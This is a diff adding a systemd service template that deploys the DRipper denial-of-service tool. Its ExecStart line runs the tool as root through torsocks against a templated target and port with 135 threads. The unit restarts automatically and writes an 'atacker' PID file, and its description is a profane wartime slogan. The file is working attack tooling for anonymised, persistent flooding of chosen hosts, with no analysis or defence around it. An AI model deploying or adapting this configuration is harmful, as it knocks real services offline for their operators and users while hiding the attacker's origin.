@@ -1,0 +1,17 @@
+[Unit]
+Description="!!russian warship go fuck yourself!!"
+After=multi-user.target
+[Service]
+Type=simple
+Restart=always
+User=root
+Group=root
+MemoryHigh={{ MemoryHigh }}
+MemoryMax={{ MemoryMax }}
+CPUQuota={{ CPUQuota }}
+MemorySwapMax=0
+WorkingDirectory={{ git_dest }}
+ExecStart=/usr/bin/torsocks /usr/bin/python3 {{ git_dest }}/DRipper.py -s {{ target }} -p {{ port }} -t 135 -q {{ time }}
+PIDFile=/tmp/ddos-ripper/atacker.pid
+[Install]
+WantedBy=multi-user.target
